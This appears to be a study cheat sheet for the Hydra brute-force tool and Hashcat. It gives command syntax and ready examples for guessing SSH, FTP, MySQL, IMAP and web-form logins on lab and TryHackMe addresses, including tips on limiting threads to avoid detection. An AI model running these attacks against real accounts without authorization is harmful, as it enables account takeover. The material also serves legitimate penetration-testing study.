# HYDRA (Password Brute Force Tool)

## Hydra Syntax Styles

### 1. New Style Syntax
```
hydra [options] protocol://target:port/module-options
```

Example:
```
hydra ftp://192.168.0.2:2221 -l admin -P list.txt
```

- l → username
- P → password list

---

### 2. Old Style Syntax
```
hydra [options] [-s port] target protocol [module-options]
```

Example:
```
hydra 192.168.0.2 ftp -l admin -P list.txt -s 2221
```

---

## Required Components for Hydra

### 1. Target

- Single target:
```
192.168.0.102
```

- Subnet:
```
192.168.2.0/24
```

---

### 2. Headers (HTTP-based attacks)

- A → auth type  
- H → custom headers  
- S → search text in HTTP response  

---

### 3. Common Options

- l → single username  
- L → username list  
- p → single password  
- P → password list  
- V → verbose output  
- t → number of tasks/threads  
- o → output file  
- m → module options  

---

### 4. Module Syntax (IMAP/FTP etc.)

Supported formats:
- LOGIN, PLAIN, CRAM-MD5, CRAM-SHA1, CRAM-SHA256, DIGEST-MD5, NTLM

Examples:
```
hydra -l test -p test -m PLAIN 127.0.0.1 imap
```

```
hydra -l test -p test 127.0.0.1 imap PLAIN
```

```
hydra -l test -p test imap://127.0.0.1/PLAIN
```

---

## Password Guessing Options (-e)

```
-e nsr
```

- n → try empty password  
- s → try username as password  
- r → reverse username as password  

---

## SSH Brute Force Examples

### Basic SSH Attack
```
hydra ssh://192.168.0.104:2222 -L word.txt -P word.txt -V
```

---

### Stop After First Success
```
hydra ssh://192.168.0.104:2222 -L word.txt -P word.txt -V -f
```

---

### Limit Threads (avoid detection)
```
hydra ssh://192.168.0.104:2222 -L word.txt -P word.txt -V -t 2
```

---

### SSH Login After Attack

```
ssh RickSanchez@192.168.0.104 -p 22222
```

---

## MySQL Brute Force

```
hydra mysql://192.168.145.137 -l root -P rockyou.txt -o output.txt -V
```

- o → save output file  
- V → verbose mode  

---

## FTP Brute Force

### Anonymous login test
```
hydra ftp://192.168.145.137 -l anonymous -e n
```

---

### Standard FTP attack
```
hydra -l username -P password-list ftp://IP
```

---

## HTTP Login Page Attack

### Steps before attack
1. Check request type (GET or POST)
2. Identify login URL (example: login.php)
3. Inspect form fields (username/password names)
4. Copy failure message from login response

---

### HTTP POST Form Attack

```
hydra 192.168.145.137 http-post-form "/login.php/:userName=^USER^&pcPassword=^PASS^&loginBtn=Submit:The username or password is incorrect"
-L rockyou.txt -P rockyou.txt -V -f
```

---

### If redirect occurs instead of message

```
:F=302
```

---

## TryHackMe Examples

### SSH Attack
```
hydra -l username -P /usr/share/wordlists/rockyou.txt 10.10.234.180 ssh -t 4
```

---

### HTTP POST Attack

```
hydra -l username -P wordlist 10.10.119.89 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

---

## Option Table

| Option | Description |
|--------|-------------|
| -l | single username |
| -P | password list |
| -t | number of threads |
| http-post-form | POST login attack |
| -V | verbose output |

---

## Hashcat (Password Cracking Tool)

### Basic Syntax
```
hashcat -m 0 -a 0 hash.txt wordlist.txt
```

---

### Attack Modes

- 0 → Dictionary attack  
- 3 → Brute force attack  
- 6 → Hybrid (wordlist + mask)  
- 7 → Hybrid (mask + wordlist)  

---

### Example (SHA-512)

```
hashcat -m 1800 hash.txt -a 0 /usr/share/wordlists/rockyou.txt
```

---

## Notes
- Always use Hydra only on authorized systems
- Increase threads carefully to avoid detection
- HTTP attacks require correct form field names
